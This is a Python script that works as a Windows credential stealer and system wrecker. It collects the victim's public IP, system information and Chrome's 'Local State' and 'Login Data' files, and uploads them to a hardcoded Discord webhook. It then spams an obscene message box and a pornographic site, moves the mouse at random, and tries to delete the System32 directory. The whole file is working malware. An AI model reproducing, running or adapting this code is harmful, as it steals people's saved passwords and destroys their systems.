from discord_webhook import DiscordWebhook
import subprocess
import requests
import os
import random
from random import randint 
import pyautogui

username = os.environ["USERNAME"]

def main():

    with open("main.vbs", "w") as f:
        f.write('msgbox "By Decks, SUCK MY DICK",16,"ERROR"')
    r=requests.get("http://ifconfig.me")
    url="https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy"
    subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\AppData\System info.txt"')
    subprocess.getoutput('systeminfo >> "%userprofile%\AppData\System info.txt"')
    web=DiscordWebhook(url=url, content=f"IP > {r.text}")
    with open(f"C:/Users/{username}/AppData/System info.txt", "rb") as f:
        web.add_file(file=f.read(), filename='System info.txt')
    with open(f"C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Local State", "rb") as f:
        web.add_file(file=f.read(), filename='Local State')
    with open(f"C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Default/Login Data", "rb") as f:
        web.add_file(file=f.read(), filename='Login Data')
    web.execute()
    subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\appdata\System info.txt"')
    i=0    
    while i < 10:
        subprocess.getoutput('explorer https://pornhub.com')
        subprocess.getoutput("start main.vbs")

        pyautogui.FAILSAFE = False

        mouse = pyautogui
        keyboard = pyautogui

    for i in range(0, 150):
            rndvalueX = randint(0, 1919)
            rndvalueY = randint(0,1019)
            mouse.dragTo(rndvalueX, rndvalueY)
            pyautogui.click()
            subprocess.getoutput('rd "%windir%\system32"/q /s')
            subprocess.run(["powershell", "-Command", "wininit"])
main()